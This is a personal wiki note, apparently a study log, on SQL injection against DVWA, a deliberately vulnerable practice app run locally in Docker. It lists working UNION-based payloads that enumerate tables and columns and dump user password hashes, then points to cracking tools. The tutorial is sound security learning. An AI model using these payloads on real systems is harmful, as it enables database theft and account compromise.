Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2020-05-27T12:31:39+03:00

====== Home ======
Created Wednesday 27 May 2020

We will use the dvwa to lean about sql injection. First let's start with the easy mode.

* start the docker service
	command: //sudo// //systemctl start docker//
* liste the available images
	command: //docker images//
* start the dvwa docker container
	command: //docker run -d -p 8080:80 infoslack/dvwa:latest//
		* //-d: //detach the container (run the container in the background)
		* //-p port_1:port_2//: bind port_2(on the container) to port_1(on the host)
And then interact with it using a browser on //localhost:8080.//

* click on the `Create / Reset Database`, and login with //admin //as a username and //password //as a password.

We will take look at the low securty option sql injection

let's check if it is vulnerable by checking various quotation . ", ', `
single qoutes seems to triger it. now let's check for the comments like This
//' ;  #//
Note this should not give you any errors.
Now we can exploit it

There is a table in MariaDB, INFORMATION_SCHEMA.TABLES, that contains the names of the tables in the database we can fetch those with a union query
//' union select TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; #//
If this gives you an error like: The used SELECT statements have a different number of columns. just add a null after the TABLE_NAME.
what is this dose has to do with what union dose. To use union with pre-existing query the number of columns that we have selected in the previous qurey must be the same with our union query like this
//select //**first_name, last_name**// from users union select //**address, phone**// from user_info;//

and in our case since we don't know what the previous query is we just add a null in the union query until it stops complaining, so the final query is
//' union select TABLE_NAME,null FROM INFORMATION_SCHEMA.TABLES; #//

we get all the tables available in the database. Let's collect the onece that are intersting. I think this will suffice: users
now let's see what columns. There is a table, INFORMATION_SCEMA.COLUMNS, which contains column_name and other stuff that I don't know, and we use the `where` with //table_name //to select specific table's column
//' union select column_name, null from INFORMATION_SCHEMA.COLUMNS where table_name='users'; #//

we get all the columns of the table but we are intersted in the password column so let's select and list it
//' union select first_name, password from users; #//

and then you get the password hashes use john or crackstation to crack them. enjoy â˜º

now let's write a python script


